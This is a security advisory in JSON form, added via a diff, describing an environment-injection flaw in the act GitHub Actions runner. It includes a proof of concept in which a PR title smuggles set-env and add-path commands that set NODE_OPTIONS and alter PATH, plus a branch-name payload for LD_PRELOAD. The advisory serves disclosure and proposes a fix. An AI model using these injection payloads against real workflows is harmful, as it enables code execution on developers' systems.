@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-xmgr-9pqc-h5vw",
+  "modified": "2026-03-27T19:31:29.639974Z",
+  "published": "2026-03-27T19:17:00Z",
+  "aliases": [
+    "CVE-2026-34041"
+  ],
+  "summary": "act: Unrestricted set-env and add-path command processing enables environment injection",
+  "details": "## Summary\n\nact unconditionally processes the deprecated `::set-env::` and `::add-path::` workflow commands, which GitHub Actions disabled in October 2020 (CVE-2020-15228, GHSA-mfwh-5m23-j46w) due to environment injection risks. When a workflow step echoes untrusted data to stdout, an attacker can inject these commands to set arbitrary environment variables or modify the PATH for all subsequent steps in the job. This makes `act` strictly less secure than GitHub Actions for the same workflow file.\n\n## Vulnerable Code\n\n**`pkg/runner/command.go`, lines 52-58:**\n\n```go\nswitch command {\ncase \"set-env\":\n    rc.setEnv(ctx, kvPairs, arg)\ncase \"set-output\":\n    rc.setOutput(ctx, kvPairs, arg)\ncase \"add-path\":\n    rc.addPath(ctx, arg)\n```\n\nThere is no check for the `ACTIONS_ALLOW_UNSECURE_COMMANDS` environment variable. The string `ACTIONS_ALLOW_UNSECURE_COMMANDS` does not appear anywhere in the act codebase.\n\nOn GitHub Actions, these commands are rejected unless `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` is set:\n\n```\nError: The `set-env` command is disabled. Please upgrade to using Environment Files\n  or opt-in by setting ACTIONS_ALLOW_UNSECURE_COMMANDS=true.\n```\n\n## PoC: Environment and PATH Injection via PR Title\n\n**Tested on:** act 0.2.84, Docker Desktop 29.1.2, macOS Darwin 24.5.0\n\n**Step 1 — Create a workflow that logs PR metadata:**\n\n`.github/workflows/vuln.yml`:\n```yaml\nname: Vulnerable Workflow\non: [pull_request]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Log PR info\n        run: |\n          echo \"Processing PR: ${{ github.event.pull_request.title }}\"\n\n      - name: Subsequent step - check environment\n        run: |\n          echo \"=== Environment Injection Check ===\"\n          echo \"NODE_OPTIONS=$NODE_OPTIONS\"\n          echo \"EVIL_VAR=$EVIL_VAR\"\n          echo \"PATH=$PATH\"\n```\n\n**Step 2 — Create a malicious event payload:**\n\n`event.json`:\n```json\n{\n  \"pull_request\": {\n    \"title\": \"Fix typo\\n::set-env name=EVIL_VAR::INJECTED_BY_ATTACKER\\n::set-env name=NODE_OPTIONS::--require=/tmp/evil.js\\n::add-path::/tmp/evil-bin\",\n    \"number\": 1,\n    \"head\": { \"ref\": \"fix-typo\", \"sha\": \"abc123\" },\n    \"base\": { \"ref\": \"main\", \"sha\": \"def456\" }\n  }\n}\n```\n\n**Step 3 — Run:**\n\n```bash\ngit init \u0026\u0026 git add -A \u0026\u0026 git commit -m \"init\"\nact pull_request -e event.json\n```\n\n**Result:**\n\n```\n[Vulnerable Workflow/build]   | Processing PR: Fix typo\n[Vulnerable Workflow/build]   ⚙  ::set-env:: EVIL_VAR=INJECTED_BY_ATTACKER\n[Vulnerable Workflow/build]   ⚙  ::set-env:: NODE_OPTIONS=--require=/tmp/evil.js\n[Vulnerable Workflow/build]   ⚙  ::add-path:: /tmp/evil-bin\n[Vulnerable Workflow/build]   ✅  Success - Main Log PR info\n\n[Vulnerable Workflow/build]   | === Environment Injection Check ===\n[Vulnerable Workflow/build]   | NODE_OPTIONS=--require=/tmp/evil.js\n[Vulnerable Workflow/build]   | EVIL_VAR=INJECTED_BY_ATTACKER\n[Vulnerable Workflow/build]   | PATH=/tmp/evil-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n[Vulnerable Workflow/build]   | EXPLOITED: EVIL_VAR was injected into this step!\n[Vulnerable Workflow/build]   ✅  Success\n[Vulnerable Workflow/build] 🏁  Job succeeded\n```\n\nAll three injections succeeded silently:\n- `EVIL_VAR=INJECTED_BY_ATTACKER` — arbitrary env var injected into subsequent step\n- `NODE_OPTIONS=--require=/tmp/evil.js` — Node.js code execution vector\n- `/tmp/evil-bin` prepended to PATH — command hijacking vector\n\n## Attack Scenarios\n\n**Scenario 1: Malicious PR title/body.** An attacker opens a PR with `::set-env name=NODE_OPTIONS::--require=/tmp/evil.js` embedded in the title. If any workflow step echoes the title (common for build summaries, Slack notifications, changelog generation), the injection fires. On GitHub Actions this is blocked. On act, it succeeds.\n\n**Scenario 2: Malicious branch name.** `${{ github.head_ref }}` is attacker-controlled. A branch named `fix-typo%0A::set-env name=LD_PRELOAD::/tmp/evil.so` can inject `LD_PRELOAD`, which causes every subsequent dynamically-linked binary to load the attacker's shared library.\n\n**Scenario 3: Commit message injection.** If a step runs `git log --oneline` and the output flows to stdout, an attacker's commit message containing `::set-env::` commands will be processed.\n\n## Impact\n\n- **Command injection** via env vars: `LD_PRELOAD`, `NODE_OPTIONS`, `PYTHONPATH`, `BASH_ENV`, `PERL5OPT` all enable arbitrary code execution\n- **PATH hijacking**: attacker-controlled directory prepended to PATH hijacks any subsequent command\n- **Cross-step escalation**: a step that merely logs untrusted data compromises all subsequent steps\n- **Supply chain risk**: workflows that are safe on GitHub Actions become exploitable when run locally with act — developers have a false sense of security\n\n## Suggested Fix\n\nAdd a check matching GitHub Actions' behavior:\n\n```go\ncase \"set-env\":\n    if rc.Env[\"ACTIONS_ALLOW_UNSECURE_COMMANDS\"] != \"true\" {\n        logger.Errorf(\"The `set-env` command is disabled. Please upgrade to using Environment Files or opt-in by setting ACTIONS_ALLOW_UNSECURE_COMMANDS=true\")\n        return false\n    }\n    rc.setEnv(ctx, kvPairs, arg)\ncase \"add-path\":\n    if rc.Env[\"ACTIONS_ALLOW_UNSECURE_COMMANDS\"] != \"true\" {\n        logger.Errorf(\"The `add-path` command is disabled. Please upgrade to using Environment Files or opt-in by setting ACTIONS_ALLOW_UNSECURE_COMMANDS=true\")\n        return false\n    }\n    rc.addPath(ctx, arg)\n```\n\nThis is a minimal, backwards-compatible fix — users who genuinely need these deprecated commands can opt in via `ACTIONS_ALLOW_UNSECURE_COMMANDS=true`, matching GitHub's approach.\n\n---\n\nWritten by Golan Myers",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/nektos/act",
+        "purl": "pkg:golang/github.com/nektos/act"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.2.86"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.2.85",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-xmgr-9pqc-h5vw/GHSA-xmgr-9pqc-h5vw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nektos/act/security/advisories/GHSA-xmgr-9pqc-h5vw"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nektos/act/commit/0c739c8e39c41aa5a07665f732da9cab6df0097a"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-mfwh-5m23-j46w"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nektos/act"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nektos/act/releases/tag/v0.2.86"
+    }
+  ]
+}
